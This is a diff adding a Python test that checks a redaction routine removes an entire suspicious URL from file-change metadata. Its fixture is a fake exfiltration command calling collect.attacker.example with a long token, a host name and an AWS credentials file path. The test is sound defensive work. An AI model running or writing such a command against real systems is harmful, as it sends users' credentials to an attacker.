@@ -931,6 +931,34 @@ class TestContentBlockRedactionAndTruncation:
         # The AKIA key in before must be scrubbed
         assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]
 
+    def test_chip_scrub_is_the_exfil_first_composition(self, short_tmp_dir: Path):
+        """A long-query exfil URL in chip content loses its WHOLE url.
+
+        `redact_exfiltration_urls` classifies partly by query length and
+        replaces the entire url; a hand-sequenced creds-first pair here would
+        shorten `?token=<long>` first and defeat it, leaking the destination
+        and payload parameters into the chip diff (the same seam
+        `discover.py`'s TestRedactExternalLayerOrder pins). The scrub must
+        stay the canonical `security.redact()` composition.
+        """
+        d = short_tmp_dir
+        f = d / "notes.md"
+        f.write_text("clean after\n")
+        exfil = (
+            "fetch https://collect.attacker.example/?token="
+            + "aB3" * 70
+            + "&host=corp-laptop&path=/home/alice/.aws/credentials\n"
+        )
+        slot = _make_slot_with_assistant_message()
+        slot._file_changes = [{"path": str(f), "content": exfil}]
+        _flush_file_changes(slot)
+        changes = slot.messages[-1]["meta"]["file_changes"]
+        before = changes[0]["before"]
+        assert "corp-laptop" not in before
+        assert "/home/alice/.aws/credentials" not in before
+        assert "?token=" not in before
+        assert "[REDACTED: suspicious URL to collect.attacker.example]" in before
+
     def test_sensitive_path_refused_even_with_diff_old_text(self):
         """Even when diff_old_text is provided, sensitive paths are refused
         — credentials must never enter message meta regardless of source."""
